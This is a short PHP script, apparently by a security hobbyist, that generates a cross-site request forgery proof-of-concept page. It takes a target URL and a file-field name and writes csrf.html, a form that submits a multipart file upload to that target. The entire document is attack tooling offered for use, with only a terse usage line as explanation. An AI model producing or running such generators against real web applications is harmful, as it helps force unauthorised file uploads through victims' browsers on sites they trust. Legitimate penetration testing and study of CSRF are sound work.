
<?php
# by b3rksecurity
echo "USAGE: php $argv[0] http://url/csrf-path eg: files[]..";
$url = $argv[1];
$postfile = $argv[2];
$poc = "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$postfile'><input type='submit' name='go' value='upload'></form>";
echo "PoC Created! Check the csrf.html file";
fwrite(fopen("csrf.html", "a+"), "$poc");
?>
